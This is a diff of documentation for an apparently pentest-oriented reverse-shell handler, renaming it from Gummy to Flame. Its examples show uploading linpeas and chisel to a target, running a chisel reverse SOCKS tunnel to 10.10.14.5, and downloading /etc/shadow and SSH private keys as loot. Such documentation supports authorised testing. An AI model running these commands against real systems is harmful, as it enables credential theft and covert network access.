@@ -1,24 +1,24 @@
 # File Transfers
 
-Gummy supports uploading and downloading files with progress tracking and integrity verification. In the TUI, transfers run asynchronously and progress appears in the status bar so the main output pane stays clean.
+Flame supports uploading and downloading files with progress tracking and integrity verification. In the TUI, transfers run asynchronously and progress appears in the status bar so the main output pane stays clean.
 
 ## Upload
 
 Upload a local file to the remote system:
 
 ```
-󰗣 gummy [1] ❯ upload /path/to/linpeas.sh /tmp/linpeas.sh
+󰗣 flame [1] ❯ upload /path/to/linpeas.sh /tmp/linpeas.sh
 ```
 
 If no remote path is given, the file is uploaded to the current working directory with the same filename:
 
 ```
-󰗣 gummy [1] ❯ upload linpeas.sh
+󰗣 flame [1] ❯ upload linpeas.sh
 ```
 
 ### Upload Methods
 
-Gummy automatically selects the best method:
+Flame automatically selects the best method:
 
 #### HTTP Mode (binbag enabled)
 
@@ -47,16 +47,16 @@ The `SmartUpload` function (used by modules too) automatically picks HTTP if bin
 Download a file from the remote system:
 
 ```
-󰗣 gummy [1] ❯ download /etc/passwd
+󰗣 flame [1] ❯ download /etc/passwd
 ```
 
 Specify a local filename:
 
 ```
-󰗣 gummy [1] ❯ download /etc/shadow shadow.txt
+󰗣 flame [1] ❯ download /etc/shadow shadow.txt
 ```
 
-Downloads are saved to the session directory: `~/.gummy/YYYY_MM_DD/IP_user_hostname/`.
+Downloads are saved to the session directory: `~/.flame/YYYY_MM_DD/IP_user_hostname/`.
 
 The process:
 
@@ -92,20 +92,20 @@ The checksum is computed on both ends and compared to ensure data integrity.
 ### Upload a tool and run it
 
 ```
-󰗣 gummy [1] ❯ upload chisel /tmp/chisel
+󰗣 flame [1] ❯ upload chisel /tmp/chisel
  Upload complete! (MD5: a1b2c3d4)
 
-󰗣 gummy [1] ❯ shell
+󰗣 flame [1] ❯ shell
 $ chmod +x /tmp/chisel && /tmp/chisel client 10.10.14.5:8888 R:1080:socks
 ```
 
 ### Download loot
 
 ```
-󰗣 gummy [1] ❯ download /etc/shadow
+󰗣 flame [1] ❯ download /etc/shadow
  Download complete! Saved to: shadow (MD5: 5d41402a)
 
-󰗣 gummy [1] ❯ download /home/user/.ssh/id_rsa
+󰗣 flame [1] ❯ download /home/user/.ssh/id_rsa
  Download complete! Saved to: id_rsa (MD5: 9e107d9d)
 ```
 
@@ -117,10 +117,10 @@ With binbag enabled, place your tools in the binbag directory and they're instan
 # On your machine
 cp chisel linpeas.sh pspy64 ~/Lab/binbag/
 
-# In gummy
-󰗣 gummy ❯ set binbag ~/Lab/binbag
+# In flame
+󰗣 flame ❯ set binbag ~/Lab/binbag
  Binbag enabled (serving ~/Lab/binbag on http://10.10.14.5:8080/)
 
-󰗣 gummy [1] ❯ upload chisel /tmp/chisel
+󰗣 flame [1] ❯ upload chisel /tmp/chisel
 # Uses HTTP — instant!
 ```
